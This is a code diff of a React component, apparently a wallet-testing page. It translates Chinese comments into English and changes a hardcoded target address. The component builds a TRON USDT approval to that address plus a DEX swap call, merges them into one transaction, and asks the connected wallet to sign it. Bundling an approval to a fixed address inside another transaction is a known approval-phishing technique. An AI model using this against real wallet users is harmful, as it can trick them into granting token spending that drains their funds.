@@ -1,24 +1,24 @@
 import { Button, message } from 'antd';
 import { useState } from 'react';
 
-// 常量配置 - 正常合约 + ABI 合约场景
+// Constant configuration - approve + swapExactETHForTokens case
 const CONTRACTS = {
-  NORMAL_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT 合约
-  ABI_CONTRACT: '41ff7155b5df8008fbf3834922b2d52430b27874f5', // ABI 合约
+  NORMAL_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT contract
+  ABI_CONTRACT: '41ff7155b5df8008fbf3834922b2d52430b27874f5',
   FROM_ADDRESS: 'TKMBdaT5E5e4X3qtff3aY2ain5pG5WNPL2',
-  TARGET_ADDRESS: 'TDgJmYStKqzawFQyMav8XxNp1pTpdhEWg9',
+  TARGET_ADDRESS: 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax',
 };
 
 const TRANSACTION_PARAMS = {
-  APPROVE_AMOUNT: 50000000, // 普通合约授权 50 USDT
-  ABI_CALL_VALUE: '1000000', // ABI 合约调用值 1 TRX
+  APPROVE_AMOUNT: 50000000, // normal contractapproval 50 USDT
+  ABI_CALL_VALUE: '1000000', // swapExactETHForTokens call value 1 TRX
 };
 
 function MultiActionNormalABI() {
   const [resultMessage, setResultMessage] = useState('');
   const [isLoading, setIsLoading] = useState(false);
 
-  // 创建普通智能合约交易 - USDT 授权
+  // Create approve(address,uint256) approval transaction
   const createNormalContractTransaction = async (tronWeb) => {
     const parameter = [
       { type: 'address', value: CONTRACTS.TARGET_ADDRESS },
@@ -34,7 +34,7 @@ function MultiActionNormalABI() {
     );
   };
 
-  // 创建 ABI 智能合约交易 - 复杂的 DEX 交易
+  // Create swapExactETHForTokens(uint256,address[],address,uint256)  transaction
   const createABIContractTransaction = async (tronWeb) => {
     return {
       transaction: {
@@ -68,7 +68,7 @@ function MultiActionNormalABI() {
     };
   };
 
-  // 合并交易
+  // Merge transaction
   const mergeTransactions = (normalTransaction, abiTransaction) => {
     const originalContract = normalTransaction.transaction.raw_data.contract[1];
 
@@ -78,7 +78,7 @@ function MultiActionNormalABI() {
     return { mergedTransaction: normalTransaction, originalContract };
   };
 
-  // 签名并发送交易
+  // Sign and broadcast transaction
   const signAndSendTransaction = async (
     tronWeb,
     mergedTransaction,
@@ -92,59 +92,59 @@ function MultiActionNormalABI() {
     return await tronWeb.trx.sign(mergedTransaction.transaction);
   };
 
-  // 主要执行函数
+  // Main execution function
   const executeMultiAction = async () => {
     const tronWeb = window.tronWeb;
 
     if (!tronWeb) {
-      throw new Error('TronWeb 未加载，请确保已连接 Tron 钱包');
+      throw new Error('TronWeb is not loaded; make sure a Tron wallet is connected');
     }
 
     try {
-      message.info('创建普通合约 + ABI 合约交易中...');
+      message.info('Create approve + swapExactETHForTokens  transaction...');
 
       const [normalTransaction, abiTransaction] = await Promise.all([
         createNormalContractTransaction(tronWeb),
         createABIContractTransaction(tronWeb),
       ]);
 
-      console.log('>>> 普通合约交易:', normalTransaction);
-      console.log('>>> ABI 合约交易:', abiTransaction);
+      console.log('>>> approve  transaction:', normalTransaction);
+      console.log('>>> swapExactETHForTokens  transaction:', abiTransaction);
 
-      message.info('合并交易中...');
+      message.info('Merging transactions...');
       const { mergedTransaction, originalContract } = mergeTransactions(
         normalTransaction,
         abiTransaction,
       );
 
-      message.info('签名并发送交易中...');
+      message.info('Signing and broadcasting transaction...');
       const result = await signAndSendTransaction(
         tronWeb,
         mergedTransaction,
         originalContract,
       );
 
-      console.log('普通合约 + ABI 合约交易结果:', result);
+      console.log('approve + swapExactETHForTokens Transaction result:', result);
       return result;
     } catch (error) {
-      console.error('普通合约 + ABI 合约交易执行失败:', error);
+      console.error('approve + swapExactETHForTokens Transaction failed:', error);
       throw error;
     }
   };
 
-  // 按钮点击处理函数
+  // Button click handler
   const handleButtonClick = async () => {
     setIsLoading(true);
     setResultMessage('');
 
     try {
       const result = await executeMultiAction();
-      setResultMessage(`交易成功: ${JSON.stringify(result)}`);
-      message.success('普通合约 + ABI 合约执行成功！');
+      setResultMessage(`Transaction succeeded: ${JSON.stringify(result)}`);
+      message.success('approve + swapExactETHForTokens succeeded!');
     } catch (error) {
-      const errorMessage = error.message || '未知错误';
-      setResultMessage(`交易失败: ${errorMessage}`);
-      message.error(`交易执行失败: ${errorMessage}`);
+      const errorMessage = error.message || 'Unknown error';
+      setResultMessage(`Transaction failed: ${errorMessage}`);
+      message.error(`Transaction failed: ${errorMessage}`);
     } finally {
       setIsLoading(false);
     }
@@ -152,18 +152,18 @@ function MultiActionNormalABI() {
 
   return (
     <div style={{ padding: '20px' }}>
-      <h3>普通合约 + ABI 合约多签名交易</h3>
+      <h3>approve + swapExactETHForTokens  multi-action transaction</h3>
       <div style={{ color: '#666', marginBottom: '16px', lineHeight: '1.5' }}>
         <p>
-          <strong>交易组合说明:</strong>
+          <strong>Transaction combination:</strong>
         </p>
         <ul style={{ paddingLeft: '20px', margin: '8px 0' }}>
           <li>
-            普通合约调用: USDT 授权{' '}
+            approve approval: USDT{' '}
             {TRANSACTION_PARAMS.APPROVE_AMOUNT / 1000000} USDT
           </li>
-          <li>ABI 合约调用: 复杂 DEX 交易 (swapExactETHForTokens)</li>
-          <li>调用价值: {TRANSACTION_PARAMS.ABI_CALL_VALUE / 1000000} TRX</li>
+          <li>swapExactETHForTokens: DEX token swap</li>
+          <li>Call value: {TRANSACTION_PARAMS.ABI_CALL_VALUE / 1000000} TRX</li>
         </ul>
       </div>
 
@@ -174,7 +174,7 @@ function MultiActionNormalABI() {
         onClick={handleButtonClick}
         style={{ marginBottom: '16px' }}
       >
-        {isLoading ? '执行中...' : '执行普通合约 + ABI 合约'}
+        {isLoading ? 'Running...' : 'Run approve + swapExactETHForTokens'}
       </Button>
 
       {resultMessage && (
@@ -187,7 +187,7 @@ function MultiActionNormalABI() {
             wordBreak: 'break-all',
           }}
         >
-          <strong>执行结果:</strong>
+          <strong>Result:</strong>
           <div style={{ marginTop: '8px' }}>{resultMessage}</div>
         </div>
       )}
